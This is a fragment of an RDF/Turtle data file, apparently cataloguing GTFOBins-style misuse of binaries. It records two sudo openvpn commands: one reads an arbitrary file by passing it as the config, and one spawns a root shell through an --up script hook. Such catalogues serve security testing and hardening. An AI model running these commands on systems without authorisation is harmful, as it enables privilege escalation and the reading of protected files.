    mknd:provided-by mknd:executable_openvpn ;
    mknd:provides mknd:function_sudo ;
    mknd:value """LFILE=file_to_read
sudo openvpn --config "$LFILE"
""",
        """sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
""" .

